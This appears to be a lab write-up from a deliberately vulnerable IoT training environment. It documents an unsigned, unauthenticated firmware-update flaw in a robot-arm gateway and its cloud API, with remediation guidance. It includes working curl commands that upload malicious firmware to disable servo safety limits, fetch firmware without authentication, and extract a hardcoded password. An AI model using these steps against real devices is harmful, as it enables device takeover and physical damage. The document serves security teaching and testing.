---
id: IoT:I4
title: "Lack of Secure Update Mechanism"
category: IoT
status: IN PROGRESS
severity: Critical
owasp: "IoT I4 - Lack of Secure Update Mechanism"
cwe: "CWE-494 (Download of Code Without Integrity Check) / CWE-345 (Insufficient Verification of Data Authenticity)"
source_docs:
  - "src/docs/OctoBot/OPENWRT_INTEGRATION.md §4, §7 (IoT:I4)"
  - "stages/01_spec/output/octobot-firmware-endpoints-spec.md"
  - "stages/02_implement/output/manifest.md"
affected_components:
  - "labs/octobot/files/opt/octobot/octobot_gateway.py"
  - "labs/octobot/files/usr/lib/vulnzoo-hooks/profile-init.d/40-octobot-flash-firmware.sh"
  - "cloud_api/octobot/app.py"
verified_date: ""
---

## Why It Matters

The gateway accepts a firmware image over plain HTTP and flashes it straight to the Arduino with no signature, no version check, and no origin check. An attacker who can POST to the arm replaces the controller firmware, which is the deepest possible compromise: the malicious build can ignore the servo angle clamps that are the device's last safety control, driving servos past their mechanical limits.

The cloud API extends this weakness. It now exposes `/api/v0/firmware`, `/api/v0/firmware/version`, and `/api/v2/firmware` for firmware download, version disclosure, and upload. The v0 endpoints are deliberate downgrades that require no session cookie, so anyone who discovers the legacy route can upload a replacement image or download the current one. The v2 endpoint requires the same operator session used by the rest of the console, but it only checks the file extension. Neither endpoint verifies a cryptographic signature, a version number, or the origin of the firmware. After a successful upload the cloud server immediately overwrites `/opt/octobot/firmware/robot_arm.hex` on the Pi, so the attack surface moves from the local network to any caller who can reach the cloud container.

The Android login panel and web UI only reference `/api/v2/firmware/version`, so they do not directly leak the v0 path. Because the API uses URL versioning, however, an attacker can fuzz lower versions and quickly discover `/api/v0/firmware` and `/api/v0/firmware/version`, both of which remain enabled and unauthenticated.

## Root Cause

```python
# labs/octobot/files/opt/octobot/octobot_gateway.py
@app.route('/update', methods=['POST'])     # [IoT:I4] unsigned OTA, flashed over plain HTTP
def update():
    request.files['firmware'].save(path)
    ...
    cmd = (f'avrdude -c arduino -p atmega328p -P {SERIAL_DEV} '
           f'-b 115200 -U flash:w:{path}:i')   # [IoT:I4] flashes attacker-supplied firmware
```

Whatever `.hex` is uploaded is flashed verbatim. There is no signature verification, no firmware version gate, and the transport is cleartext HTTP, so the image can also be tampered with in transit.

The same lack of verification is repeated in the cloud controller:

```python
# cloud_api/octobot/app.py
@app.route('/api/v0/firmware', methods=['GET', 'PUT'])
def firmware_v0():
    # [IoT:I4] [API5:2023] Intentionally downgraded endpoint: no session check.
    if request.method == 'GET':
        ...
        return send_from_directory(...)

    if 'file' not in request.files:
        return jsonify(error='no file provided'), 400
    return FirmwareService.save_and_push(request.files['file'], 'v1'), 200
```

v0 accepts any uploaded file and pushes it straight to `/opt/octobot/firmware/robot_arm.hex` on the Pi. v2 adds a session gate and a `.hex` extension check, but still does not validate content:

```python
# cloud_api/octobot/app.py
@app.route('/api/v2/firmware', methods=['GET', 'PUT'])
@login_required
def firmware_v2():
    ...
    if not uploaded_file.filename or not uploaded_file.filename.lower().endswith('.hex'):
        return jsonify(error='only .hex files are allowed'), 400

    return FirmwareService.save_and_push(uploaded_file, 'v2'), 200
```

Because the cloud server trusts the operator session as the only authorization boundary, a stolen session cookie or a downgrade to v0 is enough to replace the firmware image on the Pi.

## Steps to Reproduce

### Get the downgraded endpoint

There would be various steps to get the downgraded endpoint. [M8 — Security Misconfiguration](../Mobile/M8_Security_Misconfiguration.md) shows one way, including mobile dynamic analysis.
### Get the firmware

Once we discover the `/api/v0/firmware` endpoint we can obtain the latest firmware file by HTTP GET method.

![[iot4_firmware_download.png]]
### Analyse it
Use objcopy to convert the file to raw binary.

![[iot4_convert_hex_to_binary.png]]

```bash
# 1. Build (or obtain) a modified sketch with the angle clamps removed, compile to evil.hex.
# 2. Push it over HTTP - no auth, no signature.
curl -s -F 'firmware=@evil.hex' http://192.168.2.1:8090/update
# -> {"flashed": true, "log": "...avrdude: ... bytes of flash verified"}

# 3. The arm now runs attacker firmware; servo limits no longer enforced.
```

The firmware image itself is also trivial to inspect offline. Converting the shipped `robot_arm.hex` to binary and running `strings` recovers both the version marker (`OCTOBOT_FW_VERSION:v1.0.0`) and the hardcoded actuator password (`OctoSuperBot2026`), confirming that the image ships cleartext secrets and has no integrity envelope. See [IoT:I10-FW — Firmware Static Analysis](IoT_Firmware_Static_Analysis.md).

Cloud endpoints:

```bash
# --- v0: unauthenticated upload ---
# Upload any file; the cloud server replaces the Pi firmware path.
curl -s -X PUT -F 'file=@evil.hex' http://localhost:5002/api/v0/firmware
# -> {"version": "v1", "filename": "robot_arm.hex", "path": "/app/firmware/robot_arm.hex", "pushed": true}

# Download the current firmware image without authentication.
curl -s http://localhost:5002/api/v0/firmware -o current.hex

# --- v2: session-gated upload with extension check only ---
# Login first to obtain the session cookie.
curl -s -c cookies.txt -X POST http://localhost:5002/login \
     -d 'username=operator&password=octobot'

# Upload a .hex file; it is pushed to the Pi.
curl -s -b cookies.txt -X PUT -F 'file=@evil.hex' http://localhost:5002/api/v2/firmware
# -> {"version": "v2", "filename": "robot_arm.hex", "path": "/app/firmware/robot_arm.hex", "pushed": true}

# Upload a non-.hex file; rejected by the extension filter.
curl -s -w '%{http_code}' -b cookies.txt -X PUT -F 'file=@evil.bin' http://localhost:5002/api/v2/firmware
# -> 400 {"error": "only .hex files are allowed"}

# Without a session cookie, v2 returns 401.
curl -s -w '%{http_code}' -X PUT -F 'file=@evil.hex' http://localhost:5002/api/v2/firmware
# -> 401

# --- Static analysis of the firmware image ---
# Convert the Intel HEX to binary and inspect for cleartext secrets / version marker.
python3 -c '
import sys
with open("/opt/octobot/firmware/robot_arm.hex") as f:
    data = {}
    for line in f:
        line = line.strip()
        if not line or line[0] != ":": continue
        bc = int(line[1:3], 16)
        addr = int(line[3:7], 16)
        rt = int(line[7:9], 16)
        pl = bytes.fromhex(line[9:9+bc*2])
        if rt == 0:
            for i, b in enumerate(pl): data[addr+i] = b
out = bytearray(max(data)+1)
for a, b in data.items(): out[a] = b
open("robot_arm.bin", "wb").write(out)
'
strings robot_arm.bin | grep -iE "OCTOBOT_FW_VERSION|OctoSuperBot|PASS:|ERR AUTH"
# -> OCTOBOT_FW_VERSION:v1.0.0
# -> PASS:
# -> OctoSuperBot2026
# -> ERR AUTH
```

After a successful cloud push (or the gateway `POST /update`), check the Pi:

```bash
ssh root@192.168.2.1 'md5sum /opt/octobot/firmware/robot_arm.hex'
# If the push succeeded, the hash matches the attacker-supplied image.
```

### What the cloud PUT actually does

The cloud upload is a three-stage operation, and only the first stage is unconditional.

1. **Store in the container (always).** `FirmwareService.save_and_push` writes the uploaded file to `/app/firmware/robot_arm.hex` inside the cloud container. This always happens, which is why the request returns `200` even when the later stages fail.
2. **Copy to the Pi (needs SSH trust).** `push_to_pi` runs `ssh -o BatchMode=yes root@192.168.2.1 'cat > /opt/octobot/firmware/robot_arm.hex'`, it never calls `avrdude`. The `pushed` field reports whether that SSH copy succeeded. The default `docker-compose.yml` mounts no key into the container, so out of the box the container cannot authenticate to the Pi and `pushed` is `false` (the image stays in the container only). Provision an SSH key trusted by the Pi's `root` to get `pushed: true`.
3. **Flash the Arduino (next flash only).** Even once the image is on the Pi, nothing re-flashes the Arduino at upload time. The replaced `.hex` reaches the controller through an existing flash path: an immediate gateway OTA (`POST http://192.168.2.1:8090/update`, which runs `avrdude` on hardware) or a reboot (the `40-octobot-flash-firmware.sh` hook reflashes on cold boot, because its md5 stamp in tmpfs `/tmp/octobot/flashed.md5` is wiped). With no Arduino attached (`use_real_hardware=0`, simulation) the image is stored but never flashed.

The fast, self-contained cloud-to-arm chain is therefore two calls: the cloud PUT stages the malicious image on the Pi, then a gateway `/update` flashes it. The cloud PUT on its own replaces the stored image, it does not move the servos.

## Expected Result

On the local gateway path (`POST /update`) the uploaded image is flashed with `avrdude` on hardware, and the arm subsequently executes attacker-controlled firmware that no longer honors the `servo_min_angle`/`servo_max_angle` clamps. On the cloud path, v0 requires no credentials and v2 only checks the session cookie and file extension, so an attacker replaces the stored Pi firmware image from the cloud API. As detailed above, that cloud PUT stages the image (it does not flash the Arduino itself), which then runs on the next flash.

## How It Should Be

Sign firmware and verify the signature on-device before flashing, reject downgrades with a monotonic version counter, and serve updates over TLS from an authenticated endpoint. The flash path must refuse any image whose signature does not chain to a trusted vendor key.

For the cloud endpoints specifically, remove the unauthenticated v0 route, require a device-bound authorization check (not just a session cookie), and verify the firmware signature, version, and origin before copying the image to the Pi.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Integrity | Verify a vendor signature before flashing | Reject unsigned/tampered images |
| Anti-rollback | Monotonic firmware version gate | Block downgrade attacks |
| Transport | TLS + authenticated `/update` | Stop MITM and anonymous upload |
| Cloud auth | Device-bound authorization beyond session cookie | Prevent session theft from becoming a firmware replacement |
| Cloud validation | Signature + version check on upload | Stop extension-only filtering |
| Segregation | Remove or disable the v0 downgrade route | Close the unauthenticated path |

## Verification Checklist

- [ ] `POST /update` with an unsigned `.hex` flashes successfully (with hardware)
- [ ] No signature or version check is performed
- [ ] The flashed image can remove the servo angle clamps
- [ ] `GET /api/v0/firmware` returns the firmware image without authentication
- [ ] `PUT /api/v0/firmware` with any file succeeds and replaces the Pi firmware path
- [ ] `PUT /api/v2/firmware` without a session cookie returns 401
- [ ] `PUT /api/v2/firmware` with a session cookie and `.hex` file succeeds
- [ ] `PUT /api/v2/firmware` with a non-`.hex` file returns 400
- [ ] After upload, `/opt/octobot/firmware/robot_arm.hex` on the Pi matches the uploaded file
- [ ] Converting `robot_arm.hex` to binary and running `strings` recovers `OCTOBOT_FW_VERSION:v1.0.0`
- [ ] The same static analysis recovers the hardcoded actuator password `OctoSuperBot2026`

## Related Vulnerabilities

- [IoT:I1 — Weak, Guessable, or Hardcoded Passwords](IoT1_Weak_Guessable_Hardcoded_Passwords.md): `GET /api/v0/firmware` lets anyone download the compiled firmware, from which `strings robot_arm.bin` recovers the hardcoded actuator password `OctoSuperBot2026`.
- [API5:2023 — Broken Function Level Authorization](../API/API5_Broken_Function_Level_Authorization.md): `/api/v0/firmware` exposes the same firmware-management function as v2 without the session requirement.
- [M8 — Security Misconfiguration](../Mobile/M8_Security_Misconfiguration.md): the Android login panel discloses the `/api/v0/` route namespace before authentication by calling `GET /api/v0/firmware/version`.
